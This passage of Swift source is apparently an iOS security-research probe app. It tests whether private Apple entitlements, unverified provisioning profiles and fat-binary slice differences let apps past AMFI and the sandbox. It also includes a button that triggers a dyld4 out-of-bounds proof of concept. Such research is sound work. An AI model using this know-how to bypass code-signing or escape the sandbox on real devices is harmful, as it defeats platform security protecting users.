    r.add("claimed-keys", f.claimed.keys.sorted().joined(separator: ","))
    r.add("claimed-private", f.claimed.keys.filter { $0.hasPrefix("com.apple.private.") }.sorted().joined(separator: ","))
    r.add("honoured-count", String(f.honoured.count))
    r.add("honoured-keys", f.honoured.keys.sorted().joined(separator: ","))
    r.add("honoured-private", f.honoured.keys.filter { $0.hasPrefix("com.apple.private.") }.sorted().joined(separator: ","))
    for k in Ents.control + Ents.privateKeys {
        let h = f.honoured[k]
        let c = f.claimed[k]
        r.add("ENTITLEMENT \(k)", "claimed=\(c ?? "-") honoured=\(h ?? "-")")
    }

    // 6. DELTA -----------------------------------------------------------------
    r.section("DELTA")
    let claimedOnly = Set(f.claimed.keys).subtracting(f.honoured.keys).sorted()
    let honouredOnly = Set(f.honoured.keys).subtracting(f.claimed.keys).sorted()
    r.add("claimed-not-honoured", claimedOnly.isEmpty ? "-" : claimedOnly.joined(separator: ","))
    r.add("honoured-not-claimed", honouredOnly.isEmpty ? "-" : honouredOnly.joined(separator: ","))
    let privateHonoured = f.honoured.keys.filter { $0.hasPrefix("com.apple.private.") }.sorted()
    r.add("private-entropy-honoured", privateHonoured.isEmpty ? "NONE" : privateHonoured.joined(separator: ","))
    r.add("private-entropy-honoured-count", String(privateHonoured.count))

    // 7. EFFECTS ---------------------------------------------------------------
    r.section("EFFECTS")
    f.effects = Effects.run()
    for fct in f.effects { r.add(fct.key, fct.value) }

    // 8. ANCHORS ---------------------------------------------------------------
    r.section("ANCHOR")
    f.anchors = AnchorSet.run()
    for fct in f.anchors { r.add(fct.key, fct.value) }
    let runtimeFlag = f.anchors.first(where: { $0.key == "runtime-anchors-contains-public-apple-root" })
    f.runtimeAnchorHasPublicRoot = (runtimeFlag?.value == "YES")
    let corporateFlag = f.anchors.first(where: { $0.key == "corporate-roots-contains-public-apple-root" })
    f.anchorHasPublicRoot = (corporateFlag?.value == "YES")
    for fct in TrustProbe.evaluate(derCerts: f.profileCerts) {
        r.add(fct.key, fct.value)
        if fct.key == "trust-basic-x509" { f.trustResult = fct.value }
    }

    // 9. INSTALL ---------------------------------------------------------------
    r.section("INSTALL")
    f.install = InstallProbe.run()
    for fct in f.install { r.add(fct.key, fct.value) }

    // 10. SCENARIO -------------------------------------------------------------
    r.section("SCENARIO")
    let sigKind: String
    if sig.adhoc || sig.cmsBlob == nil {
        sigKind = "adhoc"
    } else if let leaf = f.chainCerts.first {
        let oids = DER.appleOIDs(in: leaf)
        if oids.contains("1.2.840.113635.100.6.1.2") { sigKind = "apple-dev" }
        else if oids.contains(where: { $0.hasPrefix("1.2.840.113635.100.6.1.") }) { sigKind = "apple-other" }
        else { sigKind = "non-apple" }
    } else {
        sigKind = "unknown"
    }
    let profileProvisionsPrivate = ((pdict["Entitlements"] as? [String: Any])?.keys.contains { $0.hasPrefix("com.apple.private.") }) ?? false
    let isInternalProfile = (pdict["AppleInternalProfile"] as? Bool) == true
    f.scenario = "\(sigKind)+\(pkind)+\(profileProvisionsPrivate ? "provisions-priv" : "no-priv")+\(isInternalProfile ? "internal" : "not-internal")"
    r.add("scenario-signature", sigKind)
    r.add("scenario-profile", pkind)
    r.add("scenario-profile-provisions-private", profileProvisionsPrivate ? "YES" : "no")
    r.add("scenario-profile-apple-internal", isInternalProfile ? "YES" : "no")
    r.add("scenario-id", f.scenario)

    r.flush()
    return f
}

// MARK: - Verdict engine

func evaluate(_ f: Facts) -> [Verdict] {
    var v: [Verdict] = []

    // T01 — the chain the running system trusts terminates at the PUBLIC
    // Apple Root CA.  This is the strong form of the claim: it is about the
    // chain the kernel actually accepted, not about an anchor list we may or
    // may not be able to enumerate from userland.
    let trustVerdict = f.trustResult
    v.append(Verdict(id: "T01",
                      title: "the chain the system trusts terminates at the PUBLIC Apple Root CA",
                      state: f.chainRootIsPublicAppleRoot ? "CONFIRMED" : "INCONCLUSIVE",
                      evidence: "chain-root=\(f.chainRootSHA256.prefix(16))... public-root=\(f.chainRootIsPublicAppleRoot ? "YES" : "no") trust-eval=\(trustVerdict) runtime-anchor-enumerable=\(f.runtimeAnchorHasPublicRoot ? "YES" : "no")"))

    // T02 — our leaf certificate carries 100.6.1.2 -> CT-policy bit 7.
    let leafBits = f.perCertBits.first?.1 ?? 0
    let hasBit7 = (leafBits & (UInt64(1) << 7)) != 0
    v.append(Verdict(id: "T02",
                      title: "the leaf certificate's Apple class grants CT-policy bit 7 (inside AMFI's accept mask)",
                      state: hasBit7 ? "CONFIRMED" : "REFUTED",
                      evidence: "leaf-class=\(f.leafClassOID ?? "-") leaf-bits=\(Bits.hex(leafBits))"))

    // T03 — the signer cannot write the CT-policy field: the policy the chain
    //        earns appears NOWHERE in the signed material.
    let appears = f.signature.policyFieldCandidates.contains { $0.value == f.predictedPolicy }
    v.append(Verdict(id: "T03",
                      title: "the CT-policy field is not signer-controlled (the predicted policy is absent from the signature)",
                      state: (f.predictedPolicy != 0 && !appears) ? "CONFIRMED" : "INCONCLUSIVE",
                      evidence: "predicted=\(Bits.hex(f.predictedPolicy)) appears-in-signature=\(appears ? "YES" : "no") candidates=" + f.signature.policyFieldCandidates.map { "\($0.name)=\(Bits.hex($0.value))" }.joined(separator: " ")))

    // T04 — the policy is the AND across the chain's certificates.
    v.append(Verdict(id: "T04",
                      title: "the CT policy is the AND across the chain's certificates",
                      state: "NEEDS-LOG",
                      evidence: "per-certificate bits: " + f.perCertBits.map { "\($0.0)=\(Bits.hex($0.1))" }.joined(separator: " ")
                              + " ; AND=\(Bits.hex(f.predictedPolicy)) ; correlate with the kernel's 'unsuitable CT policy' line"))

    // T05 — the App Store fast path is unreachable for a local signer.
    let fast = (f.predictedPolicy & CTPolicy.fastPathMask) != 0
    v.append(Verdict(id: "T05",
                      title: "the App Store fast path (bits 8/12/43) is unreachable without an Apple-issued chain",
                      state: fast ? "REFUTED" : "CONFIRMED",
                      evidence: "predicted=\(Bits.hex(f.predictedPolicy)) fastpath-bits=\(Bits.list(CTPolicy.fastPathMask)) has-fastpath=\(fast ? "YES" : "no")"))

    // T06 — P9 (Locally Signed) is dead on iPhone, so every binary goes P11.
    v.append(Verdict(id: "T06",
                      title: "the 'Locally Signed Fast Path' (P9) is unreachable on iPhone, so the profile check always runs",
                      state: "NEEDS-LOG",
                      evidence: "look for \"AMFI: '%s': locally signed\" in the kernel log; its ABSENCE confirms P9 is dead"))

    // T07 — the kernel does not verify the provisioning profile's own CMS.
    let profileHasNoValidSignature = f.misProfile.first(where: { $0.key == "mis-profile-validate" })?.value ?? ""
    let privateHonoured = f.honoured.keys.contains { $0.hasPrefix("com.apple.private.") }
    if f.profileData == nil {
        v.append(Verdict(id: "T07", title: "the kernel does not verify the provisioning profile's own CMS chain",
                          state: "N/A", evidence: "no profile in this scenario"))
    } else if privateHonoured {
        v.append(Verdict(id: "T07", title: "the kernel does not verify the provisioning profile's own CMS chain",
                          state: "CONFIRMED",
                          evidence: "private entitlements honoured while libmis says the profile signature is \(profileHasNoValidSignature)"))
    } else {
        v.append(Verdict(id: "T07", title: "the kernel does not verify the provisioning profile's own CMS chain",
                          state: "INCONCLUSIVE",
                          evidence: "profile signature=\(profileHasNoValidSignature) but no private entitlement was honoured; another gate may be responsible"))
    }

    // T08 — the entitlement must be provisioned or the profile must be Apple-internal.
    let provisionsPriv = ((f.profileDict["Entitlements"] as? [String: Any])?.keys.contains { $0.hasPrefix("com.apple.private.") }) ?? false
    let isInternalProfile = (f.profileDict["AppleInternalProfile"] as? Bool) == true
    if !provisionsPriv && !isInternalProfile {
        v.append(Verdict(id: "T08", title: "a private entitlement requires a provisioned or Apple-internal profile",
                          state: "N/A", evidence: "this scenario claims no private entitlement"))
    } else if privateHonoured {
        v.append(Verdict(id: "T08", title: "a private entitlement requires a provisioned or Apple-internal profile",
                          state: "CONSISTENT",
                          evidence: "honoured with provisions-priv=\(provisionsPriv) apple-internal=\(isInternalProfile)"))
    } else {
        v.append(Verdict(id: "T08", title: "a private entitlement requires a provisioned or Apple-internal profile",
                          state: "CONSISTENT",
                          evidence: "refused with provisions-priv=\(provisionsPriv) apple-internal=\(isInternalProfile)"))
    }

    // T09 — the launch gate is conditional on mis.db, not an independent wall.
    let misSelf = f.mis.first(where: { $0.key == "mis-validate-self" })?.value ?? "-"
    v.append(Verdict(id: "T09",
                      title: "the launch-time validator (libmis) does not independently re-verify the profile",
                      state: (misSelf == "0x00000000") ? "CONFIRMED" : "INCONCLUSIVE",
                      evidence: "MISValidateSignature(self)=\(misSelf); a non-zero code means the gate DID fire for this app"))

    // T10 — libmis does not re-verify the profile's CMS at launch.
    // A profile that is not DER-encoded carries no CMS signature at all, so
    // "the signature validates" means "there was nothing to validate": the
    // verdict must be N/A, not REFUTED.
    let profileIsDER = (f.misProfile.first(where: { $0.key == "mis-profile-is-der" })?.value ?? "false") == "true"
    if !profileIsDER {
        v.append(Verdict(id: "T10", title: "libmis does not re-verify the provisioning profile's CMS chain",
                          state: "N/A", evidence: "the profile is not DER-encoded: it has no CMS signature to re-verify"))
    } else {
        v.append(Verdict(id: "T10", title: "libmis does not re-verify the provisioning profile's CMS chain",
                          state: (profileHasNoValidSignature.hasPrefix("0x00000000") ? "REFUTED" : "CONSISTENT"),
                          evidence: "MISProfileValidateSignature(own profile)=\(profileHasNoValidSignature)"))
    }

    // T11 — the kernel enforces a different slice than the installer validates.
    if f.signature.isFat && f.sliceInfos.count > 1 {
        let a = f.sliceInfos[0].claimedEntitlements.keys.sorted().joined(separator: ",")
        let others = f.sliceInfos.dropFirst().map { $0.claimedEntitlements.keys.sorted().joined(separator: ",") }
        let differ = others.contains { $0 != a }
        v.append(Verdict(id: "T11", title: "the fat binary's slices can carry different entitlements",
                          state: differ ? "CONFIRMED" : "REFUTED",
                          evidence: "slice0=\(a) others=\(others.joined(separator: " | "))"))
    } else {
        v.append(Verdict(id: "T11", title: "the fat binary's slices can carry different entitlements",
                          state: "N/A", evidence: "thin binary"))
    }

    // T12 — the privileged install channel.
    let gate = f.install.first(where: { $0.key == "install-gate-allowedSPI" })?.value ?? "absent"
    v.append(Verdict(id: "T12",
                      title: "the privileged install channel opens when the caller holds allowedSPI",
                      state: (gate == "PRESENT") ? "CONFIRMED" : "REFUTED",
                      evidence: "install-gate-allowedSPI=\(gate)"))

    // T13 — LocalProvision grants nothing.
    let localProv = (f.profileDict["LocalProvision"] as? Bool) == true
    if localProv {
        v.append(Verdict(id: "T13", title: "LocalProvision demotes but never grants",
                          state: privateHonoured ? "INCONCLUSIVE" : "CONSISTENT",
                          evidence: "LocalProvision=true, private entitlements honoured=\(privateHonoured ? "YES" : "no")"))
    } else {
        v.append(Verdict(id: "T13", title: "LocalProvision demotes but never grants",
                          state: "N/A", evidence: "this scenario does not set LocalProvision"))
    }

    // T14 — is the sandbox actually off?
    let outside = f.effects.first(where: { $0.key == "write-outside-container" })?.value ?? "-"
    v.append(Verdict(id: "T14",
                      title: "a no-sandbox entitlement, when honoured, actually lifts the sandbox",
                      state: (outside == "ALLOWED") ? "CONFIRMED" : (privateHonoured ? "REFUTED" : "N/A"),
                      evidence: "write-outside-container=\(outside) private-honoured=\(privateHonoured ? "YES" : "no")"))

    // T15 — dyld4 closure OOB observed in this process's own closure
    let oobCount = f.dyld4Findings.reduce(0) { total, finding in
        total + finding.loaders.filter { $0.oob }.count
    }
    v.append(Verdict(id: "T15",
                      title: "dyld4 indexes a malloc(count) array with ref & 0x7fff without a bounds check",
                      state: oobCount > 0 ? "CONFIRMED" : "INCONCLUSIVE",
                      evidence: "oob-loaders=\(oobCount) closures=\(f.dyld4Findings.count) " +
                                f.dyld4Findings.map { "\($0.verdict):count=\($0.count)" }.joined(separator: " ") +
                                " PoC=\(f.dyld4PoC)"))

    return v.sorted { $0.id < $1.id }
}

// MARK: - UI
//
// One launch, one tap, one report.  The report is written to Documents AND
// placed on the pasteboard automatically; there is no modal dialog anywhere,
// because a wall of alerts is the fastest way to lose a researcher's
// patience and the fastest way to lose evidence.

final class ProbeViewController: UIViewController {
    private let status = UILabel()
    private let textView = UITextView()
    private let runBtn = UIButton(type: .system)
    private let pocBtn = UIButton(type: .system)
    private var report = ""
    private var facts = Facts()
    private var verdicts: [Verdict] = []

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .systemBackground
        title = "Priv-Ent Probe"

        status.text = "ready"
        status.font = .preferredFont(forTextStyle: .footnote)
        status.numberOfLines = 2
        status.textAlignment = .center

        runBtn.setTitle("Re-run", for: .normal)
        runBtn.addTarget(self, action: #selector(onRun), for: .touchUpInside)
        pocBtn.setTitle("PoC OOB", for: .normal)
        pocBtn.addTarget(self, action: #selector(onPoC), for: .touchUpInside)

        textView.isEditable = false
        textView.font = UIFont.monospacedSystemFont(ofSize: 9, weight: .regular)
        textView.text = "Open the app to run the probe."

        let stack = UIStackView(arrangedSubviews: [status, runBtn, pocBtn, textView])
        stack.axis = .vertical
        stack.spacing = 8
        stack.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(stack)

        NSLayoutConstraint.activate([
            stack.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor, constant: 8),
            stack.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 8),
            stack.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -8),
            stack.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -8),
        ])

        // Run automatically: installing and opening is the whole interaction.
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.35) { self.onRun() }
    }

    @objc private func onRun() {
        runBtn.isEnabled = false
        status.text = "running…"
        DispatchQueue.global(qos: .userInitiated).async {
            let r = Report()
            let facts = runHarness(r: r)
            let verdicts = evaluate(facts)
            r.section("VERDICTS")
            for v in verdicts {
                r.add("VERDICT \(v.id)", "\(v.state) | \(v.title) | \(v.evidence)")
            }
            r.add("VERDICT-SUMMARY", verdicts.map { "\($0.id)=\($0.state)" }.joined(separator: " "))
            r.add("=== end of run ===")
            r.flush()
            let text = r.text
            DispatchQueue.main.async {
                self.facts = facts
                self.verdicts = verdicts
                self.report = text
                self.textView.text = text
                self.runBtn.isEnabled = true
                let confirmed = verdicts.filter { $0.state == "CONFIRMED" }.count
                let refused = verdicts.filter { $0.state == "REFUTED" }.count
                self.status.text = "\(facts.scenario)\n\(confirmed) confirmed · \(refused) refuted · \(verdicts.count) theories · report saved + copied"
                UIPasteboard.general.string = text
                ProbeLogger.shared.log("PROBE DONE \(facts.scenario) confirmed=\(confirmed) refuted=\(refused)")
            }
        }
    }

    /// Explicit PoC: patch one loader Ref to 0xffff, spawn a child of this
    /// same executable (which re-runs the probe on the crafted closure),
    /// then restore the original closure. Nothing happens until tapped.
    @objc private func onPoC() {
        pocBtn.isEnabled = false
        status.text = "dyld4 PoC: patch → spawn child → restore…"
        DispatchQueue.global(qos: .userInitiated).async {
            let result = Dyld4Probe.runPoC()
            let r = Report()
            r.section("DYLD4-POC")
            r.add("dyld4-poc", result)
            r.flush()
            let text = r.text
            DispatchQueue.main.async {
                self.facts.dyld4PoC = result
                self.status.text = result
                self.report += text
                self.textView.text += text
                UIPasteboard.general.string = self.report
                self.pocBtn.isEnabled = true
            }
        }
    }
}

@main
final class AppDelegate: UIResponder, UIApplicationDelegate {
    var window: UIWindow?

    func application(_ application: UIApplication,
                     didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        let w = UIWindow(frame: UIScreen.main.bounds)
        w.rootViewController = UINavigationController(rootViewController: ProbeViewController())
        w.makeKeyAndVisible()
        window = w
        return true
    }
}
